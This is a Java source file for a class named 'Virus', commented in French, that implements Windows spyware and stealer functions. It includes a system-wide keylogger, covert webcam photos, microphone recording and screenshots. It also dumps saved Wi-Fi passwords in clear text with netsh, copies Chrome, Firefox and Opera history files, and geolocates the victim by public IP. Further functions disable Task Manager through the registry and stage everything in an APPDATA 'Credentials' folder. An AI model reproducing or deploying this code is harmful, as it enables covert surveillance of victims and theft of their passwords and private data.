package main;

import java.awt.AWTException;
import java.awt.Dimension;
import java.awt.HeadlessException;
import java.awt.Rectangle;
import java.awt.Robot;
import java.awt.Toolkit;
import java.awt.image.BufferedImage;
import java.io.BufferedReader;
import java.io.File;
import java.io.IOException;
import java.io.InputStreamReader;
import java.net.InetAddress;
import java.net.URL;
import java.util.Scanner;
import javax.imageio.ImageIO;

// Keylogger
import org.jnativehook.GlobalScreen;
import org.jnativehook.NativeHookException;

// Camera
import com.github.sarxos.webcam.Webcam;
import com.github.sarxos.webcam.WebcamResolution;

// Location
import com.maxmind.geoip2.WebServiceClient;
import com.maxmind.geoip2.exception.GeoIp2Exception;
import com.maxmind.geoip2.model.InsightsResponse;
import com.maxmind.geoip2.record.City;
import com.maxmind.geoip2.record.Country;
import com.maxmind.geoip2.record.Location;
import com.maxmind.geoip2.record.Postal;
import com.maxmind.geoip2.record.Subdivision;

/**
 * Contient plusieurs fonctions d'un virus.
 */
public class Virus {

	/*
	 * Coordonnées pour avoir accès la base données de localisation.
	 */
	final String geoIPLicenseKey = " ";
	final int geoIPUserID = 0;

	// Endroit et nom des fichiers
	final String location = System.getenv("APPDATA") + "\\Credentials\\";
	final String ecranFileName = "image.png";
	final String camFileName = "face.png";
	final String micFileName = "RecordAudio.wav";
	final String keyFileName = "keyboard.txt";
	final String programFileName = "programsList.txt";
	final String sysInfoFileName = "sysInfo.txt";
	final String locationFileName = "location.txt";
	final String wifiFileName = "wifiPass.txt";
	final String ipFileName = "ipAddress.txt";

	// Longueur de l'enregistrement du microphone
	final int recordLength = 10000;

	// Information du système
	String localIP, publicIP;
	int screenWidth, screenHeight;

	/**
	 * Copie les fichiers historiques du navigateur d'Internet spécifié. Le seul
	 * qui fonctionne bien est celui de Google Chrome, de Mozilla Firefox et
	 * d'Opera. Les autres navigateurs sont en développement. Les navigateurs
	 * doivent être fermé pour transférer ce fichier.
	 * <p>
	 * <b>Les choix :</b>
	 * <ol>
	 * <li>Google Chrome
	 * <li>Mozilla Firefox
	 * <li>Opera
	 * </ol>
	 * 
	 * @param choix
	 *            Le choix d'historique du navigateurs d'Internet.
	 * @return Le fichier d'historique du navigateur d'Internet choisi.
	 */
	public File getBrowserHistory(int choix) {
		if (choix == 1) {
			return new File(System.getenv("LOCALAPPDATA") + "\\Google\\Chrome\\User Data\\Default\\History");
		} else if (choix == 2) {
			String firefox = System.getenv("APPDATA") + "\\Mozilla\\Firefox\\Profiles\\";
			File[] directories = new File(firefox).listFiles(File::isDirectory);
			firefox = directories[0] + "\\places.sqlite";
			return new File(firefox);
		}
		if (choix == 3) {
			return new File(System.getenv("APPDATA") + "\\Opera Software\\Opera Stable\\History");
		} else {
			return null;
		}
	}

	/**
	 * Désactive le gestionnaire de tâches dans Windows en exécutant le script
	 * d'invite de commande 'taskManager.bat' pour modifier une clée du
	 * registre. Pour que cela fonctionne, vous devez accorder accès
	 * administrateur au programme grâce à UAC (contrôle de compte utilisateur)
	 * dans Windows.
	 */
	public void disableTaskManager() {
		executeProgram("taskManager.bat");
	}

	/**
	 * Change l'arrière plan du bureau dans Windows en exécutant le script
	 * d'invite de commande 'wallpaper.bat' pour modifier plusieurs clées du
	 * registre. Il se peut que l'arrière plan ne change pas instantanément, il
	 * faut des fois redémarrer l'ordinateur. Cette fonction ne fonctionne pas
	 * toujours.
	 * <p>
	 * L'endroit de l'arrière plan est à <b>C:\Users\wallpaper.bmp</b>. Le type
	 * de fichier doit être une image bitmap avec le même nom et endroit pour
	 * changer l'arrière plan.
	 */
	public void changeWallpaper() {
		executeProgram("wallpaper.bat");
	}

	/**
	 * Liste les programmes sur l'ordinateur dans Windows grâce à une commande
	 * de Windows PowerShell.
	 * 
	 * @return Le fichier avec la liste de programmes.
	 */
	public File getPrograms() {
		String c = "powershell \"Get-ItemProperty HKLM:/Software/Wow6432Node/Microsoft/Windows/CurrentVersion/Uninstall/* | Select-Object DisplayName, DisplayVersion, Publisher, InstallDate | Format-Table -AutoSize > "
				+ location + programFileName + "\"";

		executeProgram(c);

		try {
			Thread.sleep(1000);
		} catch (InterruptedException e) {
			e.printStackTrace();
		}

		return new File(location + programFileName);
	}

	/**
	 * Liste les SSID des réseaux sans-fils et leurs mots de passe dans Windows
	 * grâce à plusieurs commandes d'invite de commande.
	 * 
	 * @return Le fichier de mots de passes des réseaux sans-fils.
	 */
	public File getWifiPasswords() {

		Write write = new Write(location + wifiFileName);

		try {
			String command = "cmd /c call netsh.exe wlan show profiles";
			Process child = Runtime.getRuntime().exec(command);

			Scanner sc = new Scanner(child.getInputStream());
			while (sc.hasNextLine()) {
				String s = sc.nextLine();
				if (s.contains("All User Profile")) {
					String split[] = s.split("\\s+");
					String m = "";
					for (int i = 5; i < split.length; i++) {
						if (i == split.length - 1) {
							m += split[i];
						} else {
							m += split[i] + " ";
						}
					}

					write.write("SSID: " + m);
					write.write("Password: " + wifiPassword(m));

				}
			}
			sc.close();
		} catch (IOException e) {
		}

		return new File(location + wifiFileName);
	}

	/**
	 * Exécute une commande d'invite de commande dans Windows pour connaître le
	 * mot de passe du réseau spécifié.
	 * 
	 * @param name
	 *            Le nom du réseau choisi.
	 * @return Le mot de passe du réseau.
	 */
	public String wifiPassword(String name) {
		String pass = "";

		try {
			ProcessBuilder builder = new ProcessBuilder("cmd.exe", "/c",
					"netsh.exe wlan show profiles name=\"" + name + "\" key=clear");
			builder.redirectErrorStream(true);
			Process p;
			p = builder.start();

			Scanner sc = new Scanner(p.getInputStream());

			while (sc.hasNextLine()) {
				String line = sc.nextLine();

				if (line != null && line.contains("Key Content")) {
					String[] split = line.split("\\s+");
					pass = split[4];
					break;
				}
			}

		} catch (IOException e) {
			e.printStackTrace();
		}

		return pass;
	}

	/**
	 * Exécute les commandes passées dans cette fonction dans l'invite de
	 * commande de Windows.
	 * 
	 * @param com
	 *            La commande à exécuter dans l'invite de commande de Windows.
	 */
	public void executeProgram(String com) {
		try {
			String command = "cmd /c call " + com;
			Process child = Runtime.getRuntime().exec(command);
		} catch (IOException e) {
		}
	}

	/**
	 * Enregistre l'addresse IP publique grâce à
	 * <a href="http://checkip.amazonaws.com">http://checkip.amazonaws.com</a>
	 * et l'addresse IP locale avec les fonctions de Java.
	 * 
	 * @return Le fichier avec l'addresse IP local et publique.
	 */
	public File getIP() {
		try {
			localIP = InetAddress.getLocalHost().getHostAddress().toString();
			URL whatismyip = new URL("http://checkip.amazonaws.com");
			BufferedReader in = new BufferedReader(new InputStreamReader(whatismyip.openStream()));
			publicIP = in.readLine();
		} catch (IOException e) {
			e.printStackTrace();
		}

		Write write = new Write(location + ipFileName);

		write.write("Local IP address: " + localIP);
		write.write("Public IP address: " + publicIP);

		return new File(location + ipFileName);
	}

	/**
	 * Fait une recherche sur l'addresse IP publique du client et retourne le
	 * pays, la subdivision (province), le code postal, la ville, la longitude,
	 * le latitude, le fuseau horaire et type de région tout en disant le
	 * pourcentage d'exactitude.
	 * 
	 * @return Le fichier avec de l'informations sur la localisation du client.
	 */
	public File getLocation() {

		File temp = getIP();

		try (WebServiceClient client = new WebServiceClient.Builder(geoIPUserID, geoIPLicenseKey).build()) {

			Write write = new Write(location + locationFileName);

			// Fait une recherche
			InsightsResponse response = client.insights(InetAddress.getByName(publicIP));

			Country country = response.getCountry();
			if (country.getIsoCode() != null) {
				write.write("Country >>");
				write.write(country.getIsoCode());
				write.write(country.getName());
				write.write(country.getConfidence().toString());
				write.write("");
			}

			Subdivision subdivision = response.getMostSpecificSubdivision();
			if (subdivision.getName() != null) {
				write.write("Subdivision >>");
				write.write(subdivision.getName());
				write.write(subdivision.getIsoCode());
				write.write(subdivision.getConfidence().toString());
				write.write("");
			}

			City city = response.getCity();
			if (city.getName() != null) {
				write.write("City >>");
				write.write(city.getName());
				write.write(city.getConfidence().toString());
				write.write("");
			}

			Postal postal = response.getPostal();
			if (postal.getCode() != null) {
				write.write("Postal >>");
				write.write(postal.getCode().toString());
				write.write(postal.getConfidence().toString());
				write.write("");
			}

			Location location = response.getLocation();
			if (location.getLatitude() != null) {
				write.write("Location >>");
				write.write(location.getLatitude().toString());
				write.write(location.getLongitude().toString());
				write.write(location.getAccuracyRadius().toString());
				write.write(location.getTimeZone());
				write.write("");
			}

			if (response.getTraits() != null) {
				write.write("Type >>");
				write.write(response.getTraits().getUserType());
			}

		} catch (GeoIp2Exception | IOException e) {
			e.printStackTrace();
		}

		return new File(location + locationFileName);
	}

	/**
	 * Obtient l'information du système en exécutant une commande dans l'invite
	 * de commande de Windows et en utilisant les fonctions de base de Java. Il
	 * se peut que cette fonction doit être appelé plus qu'un fois pour qu'elle
	 * fonctionne.
	 * 
	 * @return Le fichier avec de l'informations du système du client.
	 */
	public File getSystemInfo() {

		executeProgram("systeminfo.exe > " + location + sysInfoFileName);

		try {
			Thread.sleep(3000);
		} catch (InterruptedException e) {
			e.printStackTrace();
		}

		Write w = new Write(location + sysInfoFileName);

		String nameOS = "os.name";
		String versionOS = "os.version";
		String architectureOS = "os.arch";
		String userName = "user.name";
		w.write("Nom du système opérationnel : " + System.getProperty(nameOS));
		w.write("Version du système opérationnel : " + System.getProperty(versionOS));
		w.write("Architecture de l'ordinateur : " + System.getProperty(architectureOS));
		w.write("Nom de l'utilisateur : " + System.getProperty(userName));

		w.write("Nombre de processeurs disponibles (Cores) : " + Runtime.getRuntime().availableProcessors());
		w.write("Mémoire disponible (Octets) : " + Runtime.getRuntime().freeMemory());

		long maxMemory = Runtime.getRuntime().maxMemory();
		w.write("Montant maximal de mémoire utilisable par JAVA (Octets) : "
				+ (maxMemory == Long.MAX_VALUE ? "no limit" : maxMemory));
		w.write("Montant maximal présentement disponible pour JAVA (Octets) : " + Runtime.getRuntime().totalMemory());

		File[] roots = File.listRoots();
		for (File root : roots) {
			w.write("Racine du système de fichiers : " + root.getAbsolutePath());
			w.write("Espace total (Octets) : " + root.getTotalSpace());
			w.write("Espace libre (Octets) : " + root.getFreeSpace());
			w.write("Espace utilisable (Octets) : " + root.getUsableSpace());
		}

		Dimension screenSize = Toolkit.getDefaultToolkit().getScreenSize();
		screenWidth = (int) screenSize.getWidth();
		screenHeight = (int) screenSize.getHeight();

		w.write("Longueur de l'écran: " + screenWidth);
		w.write("Hauteur de l'écran: " + screenHeight);

		return new File(location + sysInfoFileName);
	}

	/**
	 * Prend une photo haute résolution (720p), si disponible, avec la caméra de
	 * l'ordinateur et retourne se fichier.
	 * 
	 * @return La photo prise par la caméra de l'ordinateur.
	 */
	public File captureCam() {
		Webcam webcam = Webcam.getDefault();
		webcam.setCustomViewSizes(new Dimension[] { WebcamResolution.HD720.getSize() });
		webcam.setViewSize(WebcamResolution.HD720.getSize());
		webcam.open();
		BufferedImage bf = webcam.getImage();
		webcam.close();

		File temp = new File(location + camFileName);
		try {
			ImageIO.write(bf, "PNG", temp);
		} catch (IOException e) {
			e.printStackTrace();
		}
		return temp;
	}

	/**
	 * Débute l'enregistrement du microphone et par la suite, retourne le
	 * ficher.
	 * 
	 * @return Le fichier audio du microphone.
	 */
	public File captureMic() {
		EnregistreurDeSon sr = new EnregistreurDeSon(location + micFileName);

		Thread stopper = new Thread(new Runnable() {
			public void run() {
				try {
					Thread.sleep(recordLength);
				} catch (InterruptedException ex) {
					ex.printStackTrace();
				}
				sr.finish();
			}
		});

		stopper.start();
		sr.start();

		return sr.wavFile;
	}

	/**
	 * Initialise l'enregistreur de frappe.
	 */
	public void keylogger() {
		try {
			GlobalScreen.registerNativeHook();
		} catch (NativeHookException ex) {
			System.err.println(ex.getMessage());

			System.exit(1);
		}

		// GlobalKeyListener gkl = new GlobalKeyListener(location, publicIP);
		EnregistreurDeFrappes gkl = new EnregistreurDeFrappes(location, keyFileName);

		GlobalScreen.addNativeKeyListener(gkl);
	}

	/**
	 * Arrêt l'enregistreur de frappes.
	 */
	public void arret() {
		try {
			GlobalScreen.unregisterNativeHook();
		} catch (NativeHookException e) {
			e.printStackTrace();
		}
	}

	/**
	 * Retourne le fichier avec les touches de clavier du client.
	 * 
	 * @return Le ficher de touches du client.
	 */
	public File getKeylogger() {
		return new File(location + keyFileName);
	}

	/**
	 * Prend une prise d'écran grâce aux fonctions de Java.
	 * 
	 * @return La prise d'écran.
	 */
	public File captureEcran() {
		File file = null;
		try {
			// DateFormat dateFormat = new
			// SimpleDateFormat("yyyy_MM_dd__HH_mm_ss");
			// Date date = new Date();
			BufferedImage image = new Robot()
					.createScreenCapture(new Rectangle(Toolkit.getDefaultToolkit().getScreenSize()));
			file = new File(
					location + /* String.valueOf(dateFormat.format(date)) */ ecranFileName);
			ImageIO.write(image, "png", file);
		} catch (HeadlessException | AWTException | IOException e) {
			e.printStackTrace();
		}
		return file;
	}

	/**
	 * Créer le répertoire pour enregistrer les fichiers temporairements.
	 */
	public void createDir() {
		File f = new File(location);
		f.mkdirs();
		System.out.println(location);
	}

	/**
	 * Élimine le fichier désiré.
	 * 
	 * @param name
	 *            Le nom du fichier dans le répertoire temporaire voulu être
	 *            enlevé du client.
	 */
	public void destroyFile(String name) {
		new File(location + name).delete();
	}

}
